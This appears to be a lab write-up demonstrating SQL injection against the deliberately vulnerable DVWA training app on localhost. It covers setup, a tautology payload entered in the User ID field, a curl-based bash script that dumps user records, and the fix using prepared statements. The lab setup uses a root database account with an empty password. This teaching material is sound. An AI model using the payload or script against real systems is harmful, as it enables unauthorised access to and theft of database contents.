# DVWA SQL Injection (Low Security) Demo

## 🎯 Objective
Demonstrate a basic SQL Injection vulnerability using Damn Vulnerable Web Application (DVWA) with security level set to **Low**.  
The goal is to exploit improper input validation to retrieve sensitive information from the database.

---

## 🛠 Tools Used
- **Kali Linux**
- **Apache2** (web server)
- **MariaDB/MySQL** (database)
- **PHP** (server-side scripting)
- **DVWA** (Damn Vulnerable Web Application)
- **curl** (for automated exploit)

---

## 📦 Setup Steps (Kali Linux)
1. **Install Required Packages**
   ```bash
   sudo apt update
   sudo apt install apache2 mariadb-server php php-mysqli php-gd git -y
2.Start Services
sudo service apache2 start
sudo service mysql start
3.Download DVWA
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA
sudo chmod -R 755 DVWA
4.Configure DVWA
cd DVWA/config
sudo cp config.inc.php.dist config.inc.php
sudo nano config.inc.php

Set:
$_DVWA[ 'db_user' ] = 'root';
$_DVWA[ 'db_password' ] = '';
$_DVWA[ 'db_database' ] = 'dvwa';
5.Create Database
sudo mysql -u root
CREATE DATABASE dvwa;
GRANT ALL PRIVILEGES ON dvwa.* TO 'root'@'localhost' IDENTIFIED BY '';
FLUSH PRIVILEGES;
EXIT;
6.Initialize DVWA
Go to http://localhost/DVWA/setup.php → Click Create / Reset Database
Login: admin / password
Set Security Level = Low in DVWA Security tab.
🚀 Exploiting the Vulnerability
Method 1: Web Interface
Navigate to:
http://localhost/DVWA/vulnerabilities/sqli/
In User ID field, enter:
1' OR '1'='1' #
# is used as a comment in MySQL to ignore the rest of the query.
Click Submit.
You should see all user records displayed.
Why it Works:
The query becomes:
SELECT first_name, last_name FROM users WHERE id = '1' OR '1'='1' #';
Since '1'='1' is always true, the database returns all rows.
Method 2: Automated Bash Script
Create sql_injection_exploit.sh:
#!/bin/bash
URL="http://localhost/DVWA/vulnerabilities/sqli/"
COOKIE="PHPSESSID=YOUR_SESSION_ID; security=low"
curl -s -X POST "$URL" \
  -H "Cookie: $COOKIE" \
  -d "id=1' OR '1'='1' #&Submit=Submit" \
  | grep -i "First name\|Surname"

Replace YOUR_SESSION_ID with your DVWA session ID from browser DevTools.
Make it executable:
chmod +x sql_injection_exploit.sh
./sql_injection_exploit.sh
📸 Screenshots to Include

DVWA Security level set to Low

Injection input in User ID field

All user data retrieved (web interface)

Terminal output from script

🔍 Vulnerability Explanation

Cause: User input is directly concatenated into an SQL query without sanitization or parameterization.

Impact: Attackers can bypass authentication, retrieve, modify, or delete database data.

Fix:

Use prepared statements with parameterized queries.

Sanitize and validate all user inputs.

Restrict database privileges.
